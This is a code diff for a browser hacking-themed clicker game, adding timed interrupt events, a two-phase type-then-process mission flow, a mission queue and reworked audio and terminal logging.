-    cost: (lvl) => 500,
-    apply: () => { G.bandwidth = 1000; },
-    condition: () => true,
-  },
-  {
-    id: 'bw2', section: 'BANDWIDTH',
-    name: 'Cable Modem',
-    desc: 'Upgrade to 10Mb/s. Exfil speed ×3',
-    maxLevel: 1,
-    cost: () => 2500,
-    apply: () => { G.bandwidth = 10000; },
-    condition: () => (G.upgrades['bw1']||0) >= 1,
-  },
-  {
-    id: 'bw3', section: 'BANDWIDTH',
-    name: 'Fiber Optic',
-    desc: 'Upgrade to 100Mb/s. Crack speed ×5',
-    maxLevel: 1,
-    cost: () => 12000,
-    apply: () => { G.bandwidth = 100000; },
-    condition: () => (G.upgrades['bw2']||0) >= 1,
-  },
-  {
-    id: 'bw4', section: 'BANDWIDTH',
-    name: 'Dark Fiber Lease',
-    desc: '1Gb/s dedicated. All speeds ×10',
-    maxLevel: 1,
-    cost: () => 60000,
-    apply: () => { G.bandwidth = 1000000; },
-    condition: () => (G.upgrades['bw3']||0) >= 1,
-  },
-
-  // Typing / Automation
-  {
-    id: 'type1', section: 'SCRIPTING',
-    name: 'Tab Autocomplete',
-    desc: 'Each tap completes a full word',
-    maxLevel: 1,
-    cost: () => 300,
-    apply: () => { G.typingTier = 1; updateChunkSize(); },
-    condition: () => true,
-  },
-  {
-    id: 'type2', section: 'SCRIPTING',
-    name: 'Macro Hotkeys',
-    desc: 'Each tap runs the full command',
-    maxLevel: 1,
-    cost: () => 1500,
-    apply: () => { G.typingTier = 2; updateChunkSize(); },
-    condition: () => (G.upgrades['type1']||0) >= 1,
-  },
-  {
-    id: 'type3', section: 'SCRIPTING',
-    name: 'Cron Scheduler',
-    desc: 'Commands execute automatically (idle!)',
-    maxLevel: 1,
-    cost: () => 8000,
-    apply: () => { G.typingTier = 3; updateChunkSize(); startAutoTick(); },
-    condition: () => (G.upgrades['type2']||0) >= 1,
-  },
-
-  // Security / Heat
-  {
-    id: 'vpn1', section: 'SECURITY',
-    name: 'VPN Layer',
-    desc: 'Trace gain rate -25%',
-    maxLevel: 1,
-    cost: () => 800,
-    apply: () => {},
-    condition: () => true,
-  },
-  {
-    id: 'vpn2', section: 'SECURITY',
-    name: 'Tor Routing',
-    desc: 'Trace gain rate -50%',
-    maxLevel: 1,
-    cost: () => 4000,
-    apply: () => {},
-    condition: () => (G.upgrades['vpn1']||0) >= 1,
-  },
-  {
-    id: 'decoy1', section: 'SECURITY',
-    name: 'Decoy Server',
-    desc: 'Trace drains 2× faster when idle',
-    maxLevel: 1,
-    cost: () => 2000,
-    apply: () => {},
-    condition: () => (G.upgrades['vpn1']||0) >= 1,
-  },
-];
-
-// ════════════════════════════════════════════════
-// AUDIO ENGINE
-// ════════════════════════════════════════════════
-
-let audioCtx = null;
-
-function getAudioCtx() {
-  if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-  return audioCtx;
+function getInterruptChance(){
+  // Base 15%, scales with heat, reduced by latency upgrades
+  let base=0.15+(G.heat/100)*0.25;
+  if((G.upgrades.lat1||0)>=1)base*=0.8;
+  if((G.upgrades.lat2||0)>=1)base*=0.6;
+  if((G.upgrades.lat3||0)>=1)base*=0.3;
+  return Math.min(base,0.55);
 }
 
-function playTone(freq, type, duration, gain = 0.15) {
-  try {
-    const ctx = getAudioCtx();
-    const osc = ctx.createOscillator();
-    const g = ctx.createGain();
-    osc.connect(g); g.connect(ctx.destination);
-    osc.type = type;
-    osc.frequency.value = freq;
-    g.gain.setValueAtTime(gain, ctx.currentTime);
-    g.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + duration);
-    osc.start(); osc.stop(ctx.currentTime + duration);
-  } catch(e) {}
+function tryFireInterrupt(){
+  if(intState.active||G.phase!=='process')return;
+  if(Math.random()>getInterruptChance())return;
+  const valid=INTERRUPTS.filter(i=>i.condition());
+  if(!valid.length)return;
+  const int=valid[rnd(0,valid.length-1)];
+  fireInterrupt(int);
 }
 
-function playKeyClick() {
-  playTone(800 + Math.random()*400, 'square', 0.04, 0.08);
+function fireInterrupt(int){
+  intState={active:true,tapsGiven:0,timerLeft:int.timer||10,intObj:int,rewardHalved:false,processPaused:true};
+  clearInterval(procInt); // pause processing
+  log(`> ⚠ INTERRUPT: ${int.title}`,'err');
+
+  const ov=document.getElementById('interrupt-overlay');
+  document.getElementById('int-title').textContent=int.title;
+  document.getElementById('int-body').textContent=(int.body||'').replace('{timer}',int.timer||10);
+  document.getElementById('int-timer').textContent='';
+  document.getElementById('int-actions').innerHTML='';
+  ov.classList.add('on');
+
+  if(int.type==='timed_tap'){
+    intState.timerLeft=int.timer;
+    document.getElementById('int-timer').textContent=intState.timerLeft+'s';
+    const btn=document.createElement('button');
+    btn.className='int-btn'; btn.textContent=int.tapLabel;
+    btn.onclick=()=>resolveInterrupt('tap_success');
+    document.getElementById('int-actions').appendChild(btn);
+    intTimerInt=setInterval(()=>{
+      intState.timerLeft--;
+      document.getElementById('int-timer').textContent=intState.timerLeft+'s';
+      if(intState.timerLeft<=0){clearInterval(intTimerInt);resolveInterrupt('tap_fail');}
+    },1000);
+  } else if(int.type==='choice'){
+    (int.choices||[]).forEach(c=>{
+      const btn=document.createElement('button');
+      btn.className=`int-btn ${c.cls||''}`;
+      btn.textContent=c.label;
+      btn.onclick=()=>resolveInterrupt(c.outcome,c);
+      document.getElementById('int-actions').appendChild(btn);
+    });
+  } else if(int.type==='race'){
+    intState.timerLeft=int.timer;
+    document.getElementById('int-timer').textContent=`${intState.timerLeft}s — ${int.tapsNeeded} taps needed`;
+    const btn=document.createElement('button');
+    btn.className='int-btn'; btn.textContent=int.tapLabel;
+    btn.onclick=()=>{
+      intState.tapsGiven++;
+      document.getElementById('int-timer').textContent=`${intState.timerLeft}s — ${Math.max(0,int.tapsNeeded-intState.tapsGiven)} more taps`;
+      if(intState.tapsGiven>=int.tapsNeeded){clearInterval(intTimerInt);resolveInterrupt('race_win');}
+    };
+    document.getElementById('int-actions').appendChild(btn);
+    intTimerInt=setInterval(()=>{
+      intState.timerLeft--;
+      document.getElementById('int-timer').textContent=`${intState.timerLeft}s — ${Math.max(0,int.tapsNeeded-intState.tapsGiven)} more taps`;
+      if(intState.timerLeft<=0){clearInterval(intTimerInt);resolveInterrupt('race_lose');}
+    },1000);
+  }
 }
 
-function playSuccess() {
-  [440,554,659].forEach((f,i) => setTimeout(() => playTone(f,'sine',0.2,0.12), i*80));
-}
+function resolveInterrupt(outcome,choice){
+  clearInterval(intTimerInt);
+  document.getElementById('interrupt-overlay').classList.remove('on');
+  intState.active=false;
 
-function playFail() {
-  playTone(180, 'sawtooth', 0.3, 0.15);
-}
+  const int=intState.intObj;
+  G.interruptFails=G.interruptFails||0;
 
-function playPrestige() {
-  [220,277,330,440,554,659,880].forEach((f,i) =>
-    setTimeout(() => playTone(f,'sine',0.4,0.1), i*60));
-}
-
-function playModem() {
-  [1200,2400,1800,2400,3600].forEach((f,i) =>
-    setTimeout(() => playTone(f,'square',0.15,0.06), i*120));
-}
-
-// ════════════════════════════════════════════════
-// TERMINAL LOG
-// ════════════════════════════════════════════════
-
-const terminal = document.getElementById('terminal');
-
-function log(text, cls = 'log-ok') {
-  const el = document.createElement('span');
-  el.className = `log-line ${cls}`;
-  el.textContent = text;
-  terminal.appendChild(el);
-  terminal.scrollTop = terminal.scrollHeight;
-}
-
-function logSep() {
-  log('─'.repeat(38), 'log-sep');
-}
-
-// ════════════════════════════════════════════════
-// TYPING SYSTEM
-// Typing IS the progress bar.
-// progress% = chars_typed / command_length
-// Bandwidth controls chars-per-tap (not a separate counter).
-// They can NEVER desync.
-// ════════════════════════════════════════════════
-
-function getBWTier() {
-  if (G.bandwidth >= 1000000) return 4;
-  if (G.bandwidth >= 100000)  return 3;
-  if (G.bandwidth >= 10000)   return 2;
-  if (G.bandwidth >= 1000)    return 1;
-  return 1;
-}
-
-function updateChunkSize() {
-  // no-op: chunk size is computed live in getNextTypedPos
-}
-
-function initTypingForMission(mission) {
-  typingState.command = mission.command;
-  typingState.typed = 0;
-  typingState.words = mission.command.split(' ');
-  renderCmdDisplay();
-  updateTapButton();
-}
-
-function renderCmdDisplay() {
-  const full = typingState.command;
-  const typed = typingState.typed;
-  document.getElementById('cmd-text').textContent = full.slice(0, typed);
-}
-
-// Returns next typed char position after one tap
-function getNextTypedPos() {
-  const { command, typed } = typingState;
-  if (typed >= command.length) return command.length;
-
-  const tier = G.typingTier;
-
-  // Tier 2: full command in one tap
-  if (tier === 2) return command.length;
-
-  // Tier 1: one word per tap
-  if (tier === 1) {
-    const rest = command.slice(typed);
-    const spaceIdx = rest.indexOf(' ');
-    return spaceIdx === -1 ? command.length : typed + spaceIdx + 1;
+  // Outcome logic
+  let msg='',resumeProcess=true;
+  if(outcome==='tap_success'){
+    msg=int.successMsg; log(`> ✓ EVADED: ${msg}`,'ok');
+  } else if(outcome==='tap_fail'){
+    G.interruptFails++;
+    msg=int.failMsg; log(`> ✗ FAILED: ${msg}`,'warn');
+    // Escalating consequences
+    if(G.interruptFails===1){
+      addHeat(int.heatOnFail||20);
+      const fine=Math.floor(G.credits*0.05);
+      G.credits=Math.max(0,G.credits-fine);
+      if(fine>0)log(`> FINE: -$${fmtNum(fine)} (5% credit penalty)`,'warn');
+    } else if(G.interruptFails===2){
+      addHeat(int.heatOnFail||20);
+      log(`> LOCKOUT: 30s trace decay suspended`,'err');
+      // suspend heat decay for 30s
+      setTimeout(()=>log('> Lockout lifted.','dim'),30000);
+    } else {
+      log(`> REWARD CUT 50% for this mission`,'err');
+      intState.rewardHalved=true;
+    }
+    if(int.id==='auth_expired'){resumeProcess=false;abortMission();}
+  } else if(outcome==='abort'){
+    log(`> ${choice.msg}`,'warn'); resumeProcess=false; abortMission();
+  } else if(outcome==='continue'){
+    log(`> ${choice.msg}`,'warn'); addHeat(15);
+  } else if(outcome==='spoof'){
+    log(`> ${choice.msg}`,'dim'); addHeat(5);
+    intState.rewardHalved=true;
+  } else if(outcome==='throttle'){
+    log(`> ${choice.msg}`,'dim');
+    // slow process — handled by resuming with longer tick
+  } else if(outcome==='reroute'){
+    log(`> ${choice.msg}`,'warn'); addHeat(8);
+  } else if(outcome==='race_win'){
+    log(`> ✓ Target locked. Rival blocked.`,'ok');
+  } else if(outcome==='race_lose'){
+    G.interruptFails++;
+    log(`> Rival got partial access. Reward halved.`,'warn');
+    intState.rewardHalved=true;
   }
 
-  // Tier 0: BW determines chars per tap
-  // 56k=1, DSL=2, Cable=3, Fiber=4, DarkFiber=6
-  const bwChars = [0, 1, 2, 3, 4, 6][Math.min(getBWTier() + 1, 5)];
-  return Math.min(typed + Math.max(1, bwChars), command.length);
+  intState.processPaused=false;
+  if(resumeProcess&&G.missionRunning&&G.phase==='process'){
+    // Resume processing
+    const mission=MISSIONS.find(m=>m.id===G.activeMission);
+    const template=MT.find(t=>t.id===G.activeMission);
+    if(mission&&template) resumeProcessPhase(mission,template,outcome==='throttle'?2:1);
+  }
+  updateUI();
 }
 
-function tapTypeProgress() {
-  if (!G.activeMission || !G.missionRunning) return false;
-  const mission = MISSIONS.find(m => m.id === G.activeMission);
-  if (!mission) return false;
+// ══════════════════════════════════════════════════════
+// PROCESS TIME
+// ══════════════════════════════════════════════════════
+function getProcSecs(t){
+  const base=t.pBase,d=t.driver;
+  if(d==='latency')          return Math.max(2,base/(200/Math.max(G.latency,5)));
+  if(d==='cpu')              return Math.max(2,base/(G.cpu/256));
+  if(d==='bandwidth')        return Math.max(2,base/(G.bandwidth/56));
+  if(d==='cpu+ram')          return Math.max(2,base/((G.cpu/256)*.6+(G.ram/512)*.4));
+  if(d==='bandwidth+latency')return Math.max(2,base/((G.bandwidth/56+200/Math.max(G.latency,5))/2));
+  return base;
+}
+function drvLabel(d){return{latency:'RECON SWEEP',cpu:'CRACKING',bandwidth:'DATA TRANSFER','cpu+ram':'EXPLOITATION','bandwidth+latency':'DEPLOYMENT'}[d]||'PROCESSING';}
+function drvTag(d){return{latency:'PING',cpu:'CPU',bandwidth:'XFER','cpu+ram':'EXPLOIT','bandwidth+latency':'DEPLOY'}[d]||'PROC';}
 
-  // Block tapping if command fully typed (awaiting complete)
-  if (typingState.typed >= typingState.command.length) return false;
+// ══════════════════════════════════════════════════════
+// AUDIO
+// ══════════════════════════════════════════════════════
+let aCtx=null;
+function getACtx(){if(!aCtx)aCtx=new(window.AudioContext||window.webkitAudioContext)();return aCtx;}
+function tone(f,t,d,g=.12){try{const c=getACtx(),o=c.createOscillator(),gn=c.createGain();o.connect(gn);gn.connect(c.destination);o.type=t;o.frequency.value=f;gn.gain.setValueAtTime(g,c.currentTime);gn.gain.exponentialRampToValueAtTime(.001,c.currentTime+d);o.start();o.stop(c.currentTime+d);}catch(e){}}
+function playKey(){tone(700+Math.random()*500,'square',.04,.07);}
+function playOK(){[440,554,659].forEach((f,i)=>setTimeout(()=>tone(f,'sine',.25,.11),i*80));}
+function playFail(){tone(160,'sawtooth',.3,.14);}
+function playPrestige(){[220,277,330,440,554,659,880].forEach((f,i)=>setTimeout(()=>tone(f,'sine',.4,.09),i*60));}
+function playModem(){[1200,2400,1800,3600,2400].forEach((f,i)=>setTimeout(()=>tone(f,'square',.14,.06),i*120));}
+function playAlert(){[880,660,880,660].forEach((f,i)=>setTimeout(()=>tone(f,'square',.1,.1),i*150));}
 
-  // Advance typing — this IS the progress
-  const newPos = getNextTypedPos();
-  typingState.typed = newPos;
-  renderCmdDisplay();
-  playKeyClick();
+// ══════════════════════════════════════════════════════
+// TERMINAL
+// ══════════════════════════════════════════════════════
+const term=document.getElementById('term');
+function log(text,cls='ok'){const el=document.createElement('span');el.className='ll '+cls;el.textContent=text;term.appendChild(el);term.scrollTop=term.scrollHeight;}
+function logSep(){log('─'.repeat(36),'sep');}
 
-  // Progress = typed / total. Always perfectly in sync.
-  const total = typingState.command.length;
-  const newPct = Math.min(100, (newPos / total) * 100);
-  G.missionProgress = newPct;
-  updateProgress(newPct);
+// ══════════════════════════════════════════════════════
+// TYPING
+// ══════════════════════════════════════════════════════
+function getBWT(){if(G.bandwidth>=1000000)return 5;if(G.bandwidth>=100000)return 4;if(G.bandwidth>=10000)return 3;if(G.bandwidth>=1000)return 2;return 1;}
+function nextPos(state){
+  const{command,typed}=state; if(typed>=command.length)return command.length;
+  const tier=G.typingTier;
+  if(tier>=2)return command.length;
+  if(tier===1){const r=command.slice(typed);const sp=r.indexOf(' ');return sp===-1?command.length:typed+sp+1;}
+  return Math.min(typed+[0,1,2,3,4,6][Math.min(getBWT(),5)],command.length);
+}
+function renderCmd(){document.getElementById('cmdtxt').textContent=TS.command.slice(0,TS.typed);}
+function renderPrestage(){
+  const t=PS.typed,cmd=PS.command;
+  document.getElementById('prestage-typed').textContent=cmd.slice(0,t);
+  document.getElementById('prestage-rest').textContent=cmd.slice(t);
+}
 
-  // Heat per tap
-  addHeat(mission.heatPerTick * getHeatMult());
+// ══════════════════════════════════════════════════════
+// PHASE 1: TYPE
+// ══════════════════════════════════════════════════════
+function startTypePhase(mission){
+  G.phase='type'; G.interruptFails=0;
+  TS.command=mission.command; TS.typed=0; renderCmd();
+  const pl=document.getElementById('phlbl');
+  pl.textContent='// PHASE 1: EXECUTE COMMAND'; pl.className='phlbl on';
+  document.getElementById('countdown').className='countdown';
+  document.getElementById('progwrap').classList.add('on');
+  document.getElementById('proglbl').textContent='TYPING';
+  document.getElementById('progfill').className='';
+  document.getElementById('progpct').style.color='#00ff41';
+  document.getElementById('prestage').className='prestage';
+  updatePct(0); updateTapBtn();
+}
 
-  // Command fully typed → complete after brief pause
-  if (newPos >= total) {
-    setTimeout(() => { if (G.missionRunning) completeMission(); }, 300);
-  }
-
+function tapType(){
+  if(G.phase!=='type'||!G.missionRunning)return false;
+  const m=MISSIONS.find(m=>m.id===G.activeMission);
+  if(!m||TS.typed>=TS.command.length)return false;
+  const prev=TS.typed; TS.typed=nextPos(TS); renderCmd(); playKey();
+  addHeat((m.hPC||.02)*(TS.typed-prev)*(m._intelBonus?.7:1));
+  const pct=Math.min(100,(TS.typed/TS.command.length)*100);
+  G.missionProgress=pct; updatePct(pct);
+  if(TS.typed>=TS.command.length){setTimeout(()=>{if(G.missionRunning&&G.phase==='type')startProcPhase(m);},350);}
   return true;
 }
 
-// ════════════════════════════════════════════════
-// MISSION SYSTEM
-// ════════════════════════════════════════════════
-
-function selectMission(id) {
-  if (G.missionRunning) {
-    log('> ABORT current mission first', 'log-warn');
-    return;
-  }
-  const template = MISSION_TEMPLATES.find(m => m.id === id);
-  if (!template) return;
-  if (G.missionsCompleted < template.unlockAt) return;
-
-  // Generate fresh procedural instance every run
-  const mission = generateMission(template);
-  const idx = MISSIONS.findIndex(m => m.id === id);
-  if (idx >= 0) MISSIONS[idx] = mission;
-
-  G.activeMission = id;
-  G.missionProgress = 0;
-  G.missionTapsTotal = mission.taps;
-  G.missionTapsDone = 0;
-  G.missionRunning = true;
-  typingState.typed = 0;
-  initTypingForMission(mission);
-
-  logSep();
-  log(`> INITIATING: ${mission.name}`, 'log-info');
-  log(`> CMD: ${mission.command}`, 'log-dim');
-  if (mission.id === 'scp_exfil') {
-    log(`> FILE SIZE: ${formatFileSize(mission._fileSize)} @ ${formatBW(G.bandwidth)}/s`, 'log-dim');
-    const etaSecs = Math.ceil(mission._fileSize / G.bandwidth);
-    log(`> ETA: ~${etaSecs < 60 ? etaSecs+'s' : Math.ceil(etaSecs/60)+'m'}`, 'log-dim');
-  }
-  logSep();
-
-  showPanel('none');
-  updateProgress(0);
-  document.getElementById('progress-wrap').classList.add('active');
-  document.getElementById('progress-label').textContent = mission.typeTag;
-  playModem();
+// ══════════════════════════════════════════════════════
+// PHASE 2: PROCESS
+// ══════════════════════════════════════════════════════
+function startProcPhase(mission){
+  G.phase='process'; G.missionProgress=0;
+  const template=MT.find(t=>t.id===mission.id);
+  const secs=getProcSecs(template)*(mission._intelBonus&&template.id==='scp_exfil'?.7:1);
+  startProcInterval(mission,template,secs,1);
+  setupProcUI(template,secs);
+  scheduleFlavor(mission,template,secs);
+  setupPrestage();
+  // Schedule interrupt attempts
+  setTimeout(()=>tryFireInterrupt(),rnd(2000,Math.floor(secs*600)));
 }
 
-function addProgress(amount) {
-  // Direct progress injection (used by auto-tick only)
-  G.missionProgress = Math.min(100, G.missionProgress + amount);
-  updateProgress(G.missionProgress);
-  if (G.missionProgress >= 100 && G.missionRunning) {
-    completeMission();
+function setupProcUI(template,secs){
+  const pl=document.getElementById('phlbl');
+  pl.textContent=`// PHASE 2: ${drvLabel(template.driver)}`; pl.className='phlbl on proc';
+  document.getElementById('proglbl').textContent=drvTag(template.driver);
+  document.getElementById('progfill').className='proc';
+  document.getElementById('progpct').style.color='#cc44ff';
+  updatePct(0); updateTapBtn();
+  // Countdown
+  startCountdown(Math.ceil(secs));
+}
+
+function startCountdown(secs){
+  clearInterval(cdownInt);
+  let t=secs;
+  const el=document.getElementById('countdown');
+  el.className='countdown on';
+  el.textContent=`[ ${t}s ]`;
+  cdownInt=setInterval(()=>{
+    t--;
+    if(t<=0){clearInterval(cdownInt);el.className='countdown';}
+    else el.textContent=`[ ${t}s ]`;
+  },1000);
+}
+
+function startProcInterval(mission,template,secs,speedMult){
+  clearInterval(procInt);
+  const tickMs=150,totalTicks=(secs*1000)/(tickMs*speedMult);
+  let ticks=0;
+  procInt=setInterval(()=>{
+    if(intState.processPaused)return;
+    ticks++;
+    const pct=Math.min(100,(ticks/totalTicks)*100);
+    G.missionProgress=pct; updatePct(pct);
+    if(pct>=100){clearInterval(procInt);clearInterval(cdownInt);completeMission();}
+  },tickMs);
+}
+
+function resumeProcessPhase(mission,template,slowMult=1){
+  // Resume from current progress
+  const remaining=(1-G.missionProgress/100);
+  const secs=getProcSecs(template)*remaining*slowMult;
+  startProcInterval(mission,template,secs,1);
+  startCountdown(Math.ceil(secs));
+}
+
+function scheduleFlavor(mission,template,secs){
+  const fl=[...(template.flavor||[])];
+  fl.forEach((line,i)=>{
+    setTimeout(()=>{
+      if(G.phase!=='process'||G.activeMission!==mission.id)return;
+      const cooked=line
+        .replace('{port}',mission._port||randPort())
+        .replace('{user}',mission._user||randUser())
+        .replace('{hash}',randHash())
+        .replace('{n}',rnd(100,9999))
+        .replace('{ip}',mission._ip||randIP())
+        .replace('{pct}',Math.floor((i/fl.length)*100)+'%')
+        .replace('{size}',fmtFS(mission._fs||1024));
+      log('  '+cooked,'dim');
+    },(secs*1000/fl.length)*i+300);
+  });
+}
+
+function setupPrestage(){
+  // Show pre-stage area if there's a queued mission
+  if(G.missionQueue.length===0){document.getElementById('prestage').className='prestage';return;}
+  const nextId=G.missionQueue[0];
+  const nextTemplate=MT.find(t=>t.id===nextId);
+  if(!nextTemplate)return;
+  const nextMission=genMission(nextTemplate);
+  const idx=MISSIONS.findIndex(m=>m.id===nextId);
+  if(idx>=0)MISSIONS[idx]=nextMission;
+
+  PS.command=nextMission.command; PS.typed=0;
+  renderPrestage();
+  document.getElementById('prestage-lbl').textContent='// STAGING NEXT: '+nextTemplate.name;
+  document.getElementById('prestage').className='prestage on';
+
+  // If cron scheduler: auto-type pre-stage
+  if(G.typingTier>=3){
+    const autoPS=setInterval(()=>{
+      if(G.phase!=='process'){clearInterval(autoPS);return;}
+      if(PS.typed>=PS.command.length){clearInterval(autoPS);return;}
+      PS.typed=Math.min(PS.typed+3,PS.command.length);
+      renderPrestage();
+    },200);
   }
 }
 
-function updateProgress(pct) {
-  document.getElementById('progress-fill').style.width = pct + '%';
-  document.getElementById('progress-pct').textContent = Math.floor(pct) + '%';
+function tapPrestage(){
+  if(G.phase!=='process'||PS.typed>=PS.command.length)return false;
+  PS.typed=nextPos(PS); renderPrestage(); playKey(); return true;
 }
 
-function completeMission() {
-  if (!G.missionRunning) return; // guard double-fire
-  const mission = MISSIONS.find(m => m.id === G.activeMission);
-  if (!mission) return;
+// ══════════════════════════════════════════════════════
+// COMPLETE / ABORT
+// ══════════════════════════════════════════════════════
+function completeMission(){
+  if(!G.missionRunning)return;
+  const mission=MISSIONS.find(m=>m.id===G.activeMission);
+  const template=MT.find(t=>t.id===G.activeMission);
+  if(!mission||!template)return;
 
-  const earned = Math.floor(mission.reward.credits * G.rep);
-  G.credits += earned;
-  G.missionsCompleted++;
-
-  if (mission.reward.passive) {
-    // Passive credit drip (simplified: bonus credits)
-    G.credits += mission.reward.passive * 10;
-    log(`> WORM ACTIVE: +${mission.reward.passive * 10} passive credits`, 'log-ok');
+  // Store intel if this mission drops it
+  if(template.drops==='intel'){
+    G.knownTargets[mission.id]={ip:mission._ip,sn:mission._sn,port:mission._port,user:mission._user};
+    // Share intel with related missions
+    if(mission.id==='nmap_scan'){
+      ['hydra_ssh','scp_exfil','metasploit','ssh_backdoor','worm_deploy'].forEach(id=>{
+        if(!G.knownTargets[id])G.knownTargets[id]={ip:mission._ip,sn:mission._sn,port:mission._port,user:mission._user};
+      });
+      log(`> INTEL STORED: ${mission._ip} — follow-up missions get bonuses`,'info');
+    }
   }
 
-  log(`> ✓ MISSION COMPLETE: ${mission.name}`, 'log-ok');
-  log(`> CREDITS EARNED: +$${earned}`, 'log-ok');
-  playSuccess();
-  showCreditFloat(earned);
+  let base=template.reward.base;
+  const earned=Math.floor(base*G.rep*(1+G.missionsCompleted*.06)*(intState.rewardHalved?.5:1));
+  G.credits+=earned; G.missionsCompleted++;
+  checkStory();
 
-  G.missionRunning = false;
-  G.activeMission = null;
-  G.missionProgress = 0;
-  G.missionTapsDone = 0;
-  G.missionTapsTotal = 0;
-  typingState.typed = 0;
-  typingState.command = '';
+  log(`> ✓ MISSION COMPLETE: ${mission.name}`,'ok');
+  log(`> CREDITS EARNED: +$${fmtNum(earned)}`+(intState.rewardHalved?' [50% penalty]':''),'ok');
+  if(template.reward.passive)log(`> PASSIVE NODE ACTIVE`,'ok');
+  playOK(); showFloat(earned); addHeat(template.hOC||5);
 
-  document.getElementById('cmd-text').textContent = '';
-  document.getElementById('progress-wrap').classList.remove('active');
+  G.missionRunning=false; G.phase=null; G.activeMission=null; G.missionProgress=0;
+  TS.command=''; TS.typed=0; PS.command=''; PS.typed=0;
+  clearInterval(procInt); clearInterval(cdownInt);
+  document.getElementById('cmdtxt').textContent='';
+  document.getElementById('progwrap').classList.remove('on');
+  document.getElementById('phlbl').className='phlbl';
+  document.getElementById('countdown').className='countdown';
+  document.getElementById('prestage').className='prestage';
 
-  // Lock out the tap button for 900ms so rapid tappers
-  // don't accidentally open missions panel / select a mission
-  const btn = document.getElementById('tap-btn');
-  btn.classList.add('locked-out');
-  tapCooldown = true;
-  setTimeout(() => {
-    btn.classList.remove('locked-out');
-    tapCooldown = false;
-    updateTapButton();
-  }, 900);
-
+  const btn=document.getElementById('tapbtn');
+  btn.classList.add('locked'); tapCD=true;
+  setTimeout(()=>{
+    btn.classList.remove('locked'); tapCD=false; updateUI();
+    if(G.missionQueue.length>0){
+      const nid=G.missionQueue.shift(); updateQdisp(); selectMission(nid,true); // pass pre-staged flag
+    } else if(G.typingTier>=3){autoStartBest();}
+    else{updateTapBtn();}
+  },700);
   updateUI();
+}
 
-  // Auto-start if idle
-  if (G.typingTier >= 3) {
-    setTimeout(() => { if (!G.missionRunning) autoStartBestMission(); }, 1500);
+function abortMission(){
+  if(!G.activeMission)return;
+  clearInterval(procInt); clearInterval(cdownInt); clearInterval(intTimerInt);
+  document.getElementById('interrupt-overlay').classList.remove('on');
+  intState.active=false; intState.processPaused=false;
+  log('> MISSION ABORTED','warn');
+  G.missionRunning=false; G.phase=null; G.activeMission=null; G.missionProgress=0;
+  TS.command=''; TS.typed=0; PS.command=''; PS.typed=0;
+  document.getElementById('cmdtxt').textContent='';
+  document.getElementById('progwrap').classList.remove('on');
+  document.getElementById('phlbl').className='phlbl';
+  document.getElementById('countdown').className='countdown';
+  document.getElementById('prestage').className='prestage';
+  updateTapBtn(); updateUI();
+}
+
+// ══════════════════════════════════════════════════════
+// SELECT / QUEUE
+// ══════════════════════════════════════════════════════
+function selectMission(id,usePreStaged=false){
+  const template=MT.find(t=>t.id===id); if(!template)return;
+  const[minM,minC]=template.unlockAt;
+  if(G.missionsCompleted<minM||G.credits<minC)return;
+  if(G.missionRunning){
+    const slots=G.maxQueueSize-1;
+    if(G.missionQueue.length>=slots){log(`> Queue full`,'warn');return;}
+    if(G.missionQueue.includes(id)){log(`> Already queued`,'dim');return;}
+    G.missionQueue.push(id); updateQdisp();
+    log(`> QUEUED: ${template.name}`,'info');
+    renderPanel('missions'); return;
+  }
+  // Use pre-staged mission data if available
+  let mission;
+  if(usePreStaged&&PS.command&&PS.command===MISSIONS.find(m=>m.id===id)?.command){
+    mission=MISSIONS.find(m=>m.id===id); // already generated
+  } else {
+    mission=genMission(template);
+    const idx=MISSIONS.findIndex(m=>m.id===id);
+    if(idx>=0)MISSIONS[idx]=mission;
+  }
+  G.activeMission=id; G.missionRunning=true;
+  logSep();
+  log(`> INITIATING: ${mission.name}`,'info');
+  log(`> CMD: ${mission.command}`,'dim');
+  if(mission._intelBonus)log(`> INTEL BONUS ACTIVE: reduced heat & faster process`,'info');
+  log(`> Est. process: ~${Math.ceil(getProcSecs(template))}s [${drvLabel(template.driver)}]`,'dim');
+  logSep();
+  showPanel('none'); playModem();
+  // If pre-staged typing was done, carry it over
+  if(usePreStaged&&PS.typed>0&&PS.command===mission.command){
+    TS.command=mission.command; TS.typed=PS.typed;
+    PS.command=''; PS.typed=0;
+    G.phase='type';
+    const pct=(TS.typed/TS.command.length)*100;
+    document.getElementById('phlbl').textContent='// PHASE 1: EXECUTE COMMAND';
+    document.getElementById('phlbl').className='phlbl on';
+    document.getElementById('progwrap').classList.add('on');
+    document.getElementById('proglbl').textContent='TYPING';
+    document.getElementById('progfill').className='';
+    document.getElementById('progpct').style.color='#00ff41';
+    document.getElementById('prestage').className='prestage';
+    updatePct(pct); renderCmd();
+    if(TS.typed>=TS.command.length){setTimeout(()=>startProcPhase(mission),350);}
+    else updateTapBtn();
+  } else {
+    startTypePhase(mission);
   }
 }
 
-function autoStartBestMission() {
-  const available = MISSIONS.filter(m => G.missionsCompleted >= m.unlockAt);
-  if (!available.length) return;
-  const best = available[available.length - 1];
-  selectMission(best.id);
+function autoStartBest(){
+  const av=MT.filter(t=>{const[m,c]=t.unlockAt;return G.missionsCompleted>=m&&G.credits>=c;});
+  if(av.length)selectMission(av[av.length-1].id);
 }
 
-function abortMission() {
-  if (!G.activeMission) return;
-  log('> MISSION ABORTED — erasing logs...', 'log-warn');
-  G.missionRunning = false;
-  G.activeMission = null;
-  G.missionProgress = 0;
-  G.missionTapsDone = 0;
-  G.missionTapsTotal = 0;
-  typingState.typed = 0;
-  typingState.command = '';
-  document.getElementById('cmd-text').textContent = '';
-  document.getElementById('progress-wrap').classList.remove('active');
-  updateTapButton();
+function updateQdisp(){
+  const el=document.getElementById('qind'),d=document.getElementById('qdisplay');
+  if(G.missionQueue.length===0){el.classList.remove('on');return;}
+  el.classList.add('on');
+  d.textContent=G.missionQueue.map(id=>{const t=MT.find(t=>t.id===id);return t?t.name.split(':')[0].trim():id;}).join(' → ');
 }
 
-// ════════════════════════════════════════════════
-// TAP BUTTON
-// ════════════════════════════════════════════════
-
-let noMissionTapCount = 0;
-let noMissionTapTimer = null;
-
-function handleTap() {
-  if (tapCooldown) return;
-
-  if (!G.activeMission) {
-    // Require a deliberate double-tap to open missions panel
-    // This prevents accidental panel open when spamming the tap button
-    noMissionTapCount++;
-    clearTimeout(noMissionTapTimer);
-    if (noMissionTapCount >= 2) {
-      noMissionTapCount = 0;
-      showPanel('missions');
-    } else {
-      // Flash the button text to signal "tap again to open missions"
-      const btn = document.getElementById('tap-btn');
-      btn.textContent = '[ TAP AGAIN → MISSIONS ]';
